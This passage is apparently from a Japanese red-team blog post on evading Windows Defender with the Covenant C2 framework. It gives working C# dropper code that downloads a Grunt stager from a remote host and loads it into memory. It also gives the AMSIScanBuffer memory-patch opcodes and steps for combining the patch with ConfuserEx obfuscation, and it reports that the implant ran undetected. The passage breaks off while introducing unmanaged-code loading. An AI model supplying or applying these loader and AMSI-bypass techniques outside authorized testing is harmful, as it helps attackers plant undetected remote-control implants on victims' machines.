&lt;p&gt;Stagerは少し処理するだけで簡単に検知されなくなるよ、という意見が複数のブログで散見されますが、現在のWindows Defenderのファイル検知は難読化ツールを通すだけではクラウド保護によって検知されます。アンチウイルスや検知回避はいたちごっこが激しく、すぐに陳腐化してしまうのです。そう、あなたが見ているこの記事も。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;せっかくRed TeamingでCovenantを使うとしても、Windows Defenderがオフの環境でないと使えませんと顧客に説明するのは嫌ですよね？&lt;/p&gt;
&lt;p&gt;これを読めば、少なくとも顧客にWindows Defenderをオフにしてもらわなくても済むようになります。&lt;/p&gt;
&lt;h3 id=&#34;留意事項&#34;&gt;留意事項&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;本記事はエージェントの確立までのアンチウイルスソフトの検知回避にのみフォーカスを当てて解説をしています。EDRの検知回避は範囲外です。&lt;/li&gt;
&lt;li&gt;未加工のStagerをダウンロードする関係上、DownloadフォルダをWindows Defenderの例外フォルダに設定してください。検知テストはファイルを別フォルダに移動するなどして行うと楽です。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;最初のほうはWindows Defenderの「クラウド提供の保護」および「サンプルの自動送信」をオフにしてください&lt;/strong&gt;。この機能は一度検知されてしまうと、本機能をオフにしてもリアルタイムスキャンで同じバイナリを検知するようになってしまいます。後半ではこれらをオンにしたうえで検知回避をします。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;オリジナルバイナリの検知内容の確認&#34;&gt;オリジナルバイナリの検知内容の確認&lt;/h2&gt;
&lt;p&gt;まずはGruntのStagerがWindows Defenderによって検知されることを確認します。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;※Covenantのインストール方法や使い方はここでは説明しません。Googleで検索すれば日本語記事が出てくるので、それを読むと良いでしょう。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;まずはCovenantのListener画面。HttpProfileはDefaultHttpProfileで、何も変更していないプレーンな状態にしています。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/listener.png&#34; alt=&#34;listener&#34;&gt;
&lt;/p&gt;
&lt;p&gt;次にCovenantのLauncherからBinary Launcherを選択し、Downloadします。すると以下のようにWindows Defenderによって検知されます。検出名は「VirTool:MSIL/Covent.A」でした。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/raw_binary_def.png&#34; alt=&#34;raw_binary_def&#34;&gt;
&lt;/p&gt;
&lt;p&gt;まずはどう検知したのかを &lt;a href=&#34;https://github.com/matterpreter/DefenderCheck&#34;&gt;DefenderCheck&lt;/a&gt; で確認します。DefenderCheckはWindowsDefenderの コマンドラインツール「MpCmdRun.exe」 のラッパーで、ファイルを先頭から256バイトごとに結合して MpCmdRun.exe に投げてくれます。 検知される場合、検出名と検知したブロックのバイナリがhexで表示されます。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/raw_binary_defcheck.png&#34; alt=&#34;raw_binary_defcheck&#34;&gt;
&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;DefenderCheckはあくまでファイルのどの時点で検知されたかを教えてくれるだけです。最後のブロック以前の部分にも検出名の検知対象のデータが含まれているので注意。なおDefenderCheckに後述するAMSIのチェック機能を追加した &lt;a href=&#34;https://github.com/rasta-mouse/ThreatCheck&#34;&gt;ThreatCheck&lt;/a&gt; というものもあります。これを使ってもOK。&lt;/p&gt;
&lt;p&gt;Windows Defenderのシグネチャ周りの話は、Allsafe様の「&lt;a href=&#34;https://allsafe.booth.pm/items/1861943&#34;&gt;ミミミミミッミ&lt;/a&gt;」に書かれているので要チェックだ！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;hexからわかるとおり、バイナリに含まれる文字列で検知されていそうです。Covenantは .NET 製であるため、逆コンパイルが可能です。逆コンパイラであるdnSpyで見ると、いかにも検知されそうなものがたくさんバイナリに含まれていることがわかります。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/dnSpy_raw.png&#34; alt=&#34;dnSpy_raw&#34;&gt;
&lt;/p&gt;
&lt;h3 id=&#34;confuserexでstagerを難読化&#34;&gt;ConfuserExでStagerを難読化？&lt;/h3&gt;
&lt;p&gt;GruntのImplantおよびLauncherの画面でStagerのコードを律儀に変えてもいいですが、手動のリネームで検知回避をしようとすると最初からなかなかの労力がかかります。&lt;/p&gt;
&lt;p&gt;そういうときに、難読化ツールの &lt;a href=&#34;https://github.com/mkaring/ConfuserEx&#34;&gt;ConfuserEx&lt;/a&gt; を用いて.NET バイナリを難読化するのが選択肢に入ります。（使い方は割愛。）&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;オリジナルのConfuserExは更新停止しています。現在はmkaring氏のConfuserEx2を利用するといいでしょう。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;
  &lt;img src=&#34;images/stage_confuser.png&#34; alt=&#34;stage_confuser&#34;&gt;
&lt;/p&gt;
&lt;p&gt;このようにConfuserEXを通すことで、アンチウイルスソフトのシグネチャベースの検知を回避することが可能です。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/defender_check_bypass.png&#34; alt=&#34;defender_check_bypass&#34;&gt;
&lt;/p&gt;
&lt;p&gt;しかしアンチウイルスソフトを侮ってはいけません。たとえ文字列要素を排除したとしても、Windows Defenderのクラウド保護機能はまだ検知をしてくる場合があります。CovenantをConfuserExによって難読化処理しても、クラウド保護機能はそれを「Trojan:Win32/Wacatac.C!ml」という検出名で検知するようになります。(&lt;strong&gt;詳細は後述&lt;/strong&gt;)&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;なおこういったツールで難読化すること自体がアンチウイルスソフトのフラグを立たせてしまう可能性もあるので、使用には注意が必要です。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;このことから、不審なバイナリであるStagerそのものをディスクに保存する手法は、単純に難読化するだけでは検知される可能性があるといえるでしょう。&lt;/p&gt;
&lt;h3 id=&#34;リモートからアセンブリをメモリにロードする&#34;&gt;リモートからアセンブリをメモリにロードする？&lt;/h3&gt;
&lt;p&gt;ファイルで検知をしてしまうなら、そもそもStagerをディスクに保存しないようにすればいいのです。&lt;/p&gt;
&lt;p&gt;といっても今回侵害の起点はexeファイルの実行としているので、ローダはどうしてもファイルとして持っておく必要があります。ただローダはエージェントを外部から取得するドロッパー機能だけを搭載することで、ファイル検知エンジン（およびクラウド保護）の検知ポイントを最小限にすることができます。&lt;/p&gt;
&lt;p&gt;それでは外部からアセンブリを取得し Assembly.Load() で動的にメモリに読み込むようにしてみましょう。これでWindows Defenderは回避できるでしょうか？&lt;/p&gt;
&lt;p&gt;Covenant はファイルホスティング機能を持っており、Launcherの画面からファイルをホスティングさせることができます。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/cov_hosting.png&#34; alt=&#34;cov_hosting&#34;&gt;
&lt;/p&gt;
&lt;p&gt;次にサーバからStagerを取得しメモリにロードするプログラムを書きます。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c#&#34; data-lang=&#34;c#&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;using&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;using&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;System.Net&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;using&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;System.Reflection&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;namespace&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;Dropper&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Program&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;kt&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;wc&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;WebClient&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;c1&#34;&gt;// Reflectively load assembly from a remote URL&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;kt&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Assembly&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Load&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DownloadData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;http://192.168.11.254/GruntHTTP.exe&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;c1&#34;&gt;// Create instance&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;kt&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;t&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GetType&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;GruntStager.GruntStager&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;kt&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Activator&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CreateInstance&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;c1&#34;&gt;// Call Stager&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;kt&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;m&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GetMethod&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;GruntStager&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;kt&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;output&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Invoke&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;c1&#34;&gt;// Pause for input&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;Console&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ReadKey&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;コンパイルし、実行した結果がこちらです。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/assembly_load_detect.png&#34; alt=&#34;assembly_load_detect&#34;&gt;
&lt;/p&gt;
&lt;p&gt;残念ながら、ログに出ているようにWebからメモリに展開されたGruntはアンチウイルスソフトによって検知されています。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ファイルにウイルスまたは望ましくない可能性のあるソフトウェアが含まれているため、操作は正常に完了しませんでした。&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;これは &lt;strong&gt;AMSI&lt;/strong&gt; の機能によるものです。AMSIとはAntimalware Scan Interfaceの略で、アンチウイルスソフトに依存しない、悪意のあるコンテンツをスキャンするインターフェースです。アンチウイルスソフトはAMSIを利用して&lt;strong&gt;メモリ&lt;/strong&gt;上に読み込まれるコンテンツをスキャンできます。&lt;/p&gt;
&lt;p&gt;AMSI が動作するランタイムは複数あり、現在は PowerShell, WSH, VBA, .NET のランタイム用エンジンが存在します。これらのランタイムによってそれぞれエンジンの動作は異なります。PowerShell 5で搭載され、Powershellで実行されるコードを対象としていましたが、.NET 4.8 からはCLRに統合され、 .NET で読み込まれるアセンブリもスキャン対象になりました。&lt;/p&gt;
&lt;p&gt;そのためファイルレスだったとしても、Assembly.Load()を用いた手法ではメモリの内容がAMSIを通してアンチウイルスソフトによって検閲され、不正と判断された場合は検知されてしまいます。&lt;/p&gt;
&lt;h4 id=&#34;defenderのサイレント検知&#34;&gt;Defenderのサイレント検知&lt;/h4&gt;
&lt;p&gt;このAMSIによる検知、Windows Defender上では&lt;strong&gt;デスクトップ上にアラートが表示されずにサイレントで検知し終了するパターンがあります&lt;/strong&gt;。例えば上のAssembly.Load()で読み込んだ例が顕著で、これだとどの検出名で検知したかどうかがわかりません。しかしMicrosoftのEDR製品であるMicrosoft Defender for Endpointを契約して管理コンソールで確認してみると、検出名「VirTool:MSIL/Covent.A」で検知していることがわかります。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/atp_amsi_detect.png&#34; alt=&#34;atp_amsi_detect&#34;&gt;
&lt;/p&gt;
&lt;p&gt;ファイル名の部分はamsistreamになっており、AMSI経由で検知したことがわかります。このサイレント検知現象は過去の私含め、世界の駆け出しnoob達の最初の壁になっているようです。&lt;/p&gt;
&lt;h4 id=&#34;stage2読み込み時のamsi検知&#34;&gt;Stage2読み込み時のAMSI検知&lt;/h4&gt;
&lt;p&gt;また、仮にStagerをファイル・メモリどちらでも検知回避したとしても、StagerがGruntのStage 2を取得しメモリに読み込んだ時点でまた別の検知がされることもあります。&lt;/p&gt;
&lt;p&gt;以下は検知回避を行ったStagerバイナリを実行し、Stage2で検知されたときの図です。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/confuser_amsi_stage2.png&#34; alt=&#34;confuser_amsi_stage2&#34;&gt;
&lt;/p&gt;
&lt;p&gt;メモリにStage2を読みこんだ時点で、AMSIを通じて「VirTool:MSIL/Covent.C」として検知されます。（こちらはDefenderの画面でアラートが表示されました）&lt;/p&gt;
&lt;p&gt;Covenant はStagerからの初回通信時にStage2 (ExecutorCode) をコンパイルし送信します。このコードはTemplatesから変更できるので難読化もできないことはないのですが、HTTPProfileやらの内容を置換してコンパイルする必要があったりするので、変えるのはなかなか面倒です。&lt;/p&gt;
&lt;h2 id=&#34;amsiバイパスする&#34;&gt;AMSIバイパスする&lt;/h2&gt;
&lt;p&gt;AMSI は上記のように何も対策をしていない .NET アセンブリにとって脅威です。しかしAMSIには大きな欠点があります。AMSIはユーザランドでプログラム実行時にamsi.dllをロードさせる仕組み上、当該dllに対するメモリパッチによって容易にバイパスされるのです。&lt;/p&gt;
&lt;p&gt;rasta-mouse氏が公開している .NET 製のAMSIバイパスライブラリ「&lt;a href=&#34;https://github.com/rasta-mouse/AmsiScanBufferBypass&#34;&gt;AMSIScanBufferBypass&lt;/a&gt;」は、amsi.dll に存在するAMSIScanBufferの関数アドレスの先頭を、常に安全なコードであることを示す「AMSI_RESULT_CLEAN」(0x80070057)を返すように、以下のオペコードでパッチします。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;mov    eax,0x80070057
ret
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;こうすることでAMSIは全てのコンテンツをAMSIプロバイダーに渡さずに即座にクリーンと誤認します。詳しくは氏の&lt;a href=&#34;https://rastamouse.me/blog/asb-bypass-pt3/&#34;&gt;ブログ投稿&lt;/a&gt;をお読みください。&lt;/p&gt;
&lt;p&gt;ということで、先ほどのバイナリにAMSIScanBufferBypassを適用してみましょう。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c#&#34; data-lang=&#34;c#&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;(..&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;snip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;..)&lt;/span&gt;      
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;Amsi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Bypass&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;kt&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;wc&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;WebClient&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;(..&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;snip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;..)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;AMSIScanBufferBypassのコードをローダーと同じところにおいて、Bypass()を呼び出すだけです。&lt;/p&gt;
&lt;p&gt;ビルド後はいったんConfuserEXで難読化しておきます（そのままだとバイパスコードが「Win32/AmsiTamper.B」として検知されます）。&lt;/p&gt;
&lt;p&gt;難読化したバイナリを実行した結果が以下です。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/amsi_bypass_rasta.png&#34; alt=&#34;amsi_bypass_rasta&#34;&gt;
&lt;/p&gt;
&lt;p&gt;無事、Windows Defenderの検知を回避してAMSIバイパスを発火させ、Stage2のAMSIスキャンもバイパスしてGruntがアクティベーションされました。&lt;/p&gt;
&lt;h4 id=&#34;おまけ-amsi対応版-defendercheck&#34;&gt;おまけ: AMSI対応版 DefenderCheck&lt;/h4&gt;
&lt;p&gt;オリジナルのDefenderCheckはファイルのスキャンのみに対応していましたが、rasta-mouse氏がフォークした「&lt;a href=&#34;https://github.com/rasta-mouse/ThreatCheck&#34;&gt;ThreatCheck&lt;/a&gt;」はAMSIにも対応しています。原理は単純で、DefenderCheckと同じようにブロックごとにデータを分割しAMSIScanBufferに投げるという実装です。もしあなたがStagerを外部サーバに配置してドロップする方法をとるなら、事前にThreatCheckで検知テストすることをお勧めします。&lt;/p&gt;
&lt;h2 id=&#34;アンマネージドコードでamsiバイパス&#34;&gt;アンマネージドコードでAMSIバイパス&lt;/h2&gt;
&lt;h3 id=&#34;net-製amsiバイパスの罠&#34;&gt;.NET 製AMSIバイパスの罠&lt;/h3&gt;
&lt;p&gt;前項では .NET 製のローダにAMSIバイパスを組み込んでStagerをロードしました。ただ .NET 製プログラムを使ったAMSIバイパスには少し不安が残ります。.NET アセンブリではバイパスする以前から既にamsi.dllが読み込まれている以上、&lt;strong&gt;AMSIバイパスのコードがAMSIによって検知される&lt;/strong&gt;という&lt;strong&gt;鶏卵問題&lt;/strong&gt;に直面する可能性があるのです。&lt;/p&gt;
&lt;p&gt;わかりやすい例として、AMSIBufferBypassを外部からメモリに読み込み発火させることを考えましょう。以下のようなコードになります。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Assembly.Load(wc.DownloadData(&amp;#34;http://192.168.11.254/ASBBypass.dll&amp;#34;));
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;これを実行すると、やはりAMSIにて検知され、実行がブロックされました。以下はDefender ATPの画面です。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/amsi_tamper_detected_atp.png&#34; alt=&#34;amsi_tamper_detected_atp&#34;&gt;
&lt;/p&gt;
&lt;p&gt;ThreatCheck での実行結果はこちらです。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/threatcheck_asb_detect.png&#34; alt=&#34;threatcheck_asb_detect&#34;&gt;
&lt;/p&gt;
&lt;p&gt;オリジナルのASBBypassに紐づくもの(GUID, アセンブリ情報, pdb)を検知するほか、それらの情報を削除しても、画像のようにまだ検知する部分があります。赤枠で囲ったものは、パッチするオペコード「mov eax, 0x80070057 / ret」の部分です。&lt;/p&gt;
&lt;p&gt;これを回避するためにはいくつかの方法が考えられます。よくあるのがバイパスコードの&lt;a href=&#34;https://fatrodzianko.com/2020/08/25/getting-rastamouses-amsiscanbufferbypass-to-work-again/&#34;&gt;ルーチン変更&lt;/a&gt;や暗号化です。実際、そのようにAMSIバイパスコードをカスタマイズすれば割と検知されなくなります。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ルーチン変更については次回説明予定です。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;そもそもamsiを避ける&#34;&gt;そもそもAMSIを避ける&lt;/h3&gt;
&lt;p&gt;もうひとつ鶏卵問題を避ける方法として考えられるのは、そもそもamsi.dllがロードされないアンマネージドコードのバイナリを利用することです（ファイルスキャンを回避するテクニックは結局必要になりますが）。いわゆる C/C++ で書かれるようなネイティブプログラムですね。&lt;/p&gt;
&lt;p&gt;そもそも全ての侵害を .NET を使わずにアンマネージドコードで済ませるならAMSIなんて気にする必要はありませんが、あいにくCovenantは .NET 製なのです。そのためアンマネージドコードでAMSIバイパスを行い、 .NET アセンブリを読み込み実行させる必要があります。&lt;/p&gt;
&lt;p&gt;これを可能とする実用的なものは先人たちが作ってくれています。&lt;strong&gt;donut&lt;/strong&gt; です。ただこのツールの紹介はあとにして、ここではAMSIバイパスしたうえでアンマネージドコードから .NET アセンブリを読み込む簡単な実証コードを紹介します。（脱スクリプトキディ！）&lt;/p&gt;
&lt;h3 id=&#34;executeindefaultappdomain&#34;&gt;ExecuteInDefaultAppDomain()&lt;/h3&gt;
&lt;p&gt;アンマネージドコードから .NET アセンブリを呼び出す方法は昔から存在します。.NET ランタイム、つまりCLRを扱うためにドメイン中立アセンブリとして mscorlib.dll がいます。このdllが提供しているAPIを使って .NET アセンブリを処理してもらえばいいのです。&lt;/p&gt;
&lt;p&gt;static メソッドを呼ぶ用途だけなら ExecuteInDefaultAppDomain() を利用して簡単に .NET アセンブリを呼び出すことができます。ただし、このメソッドから呼び出されるコードは必ず以下のシグネチャが必要です(当然メソッド名・引数名は自由です)。&lt;/p&gt;
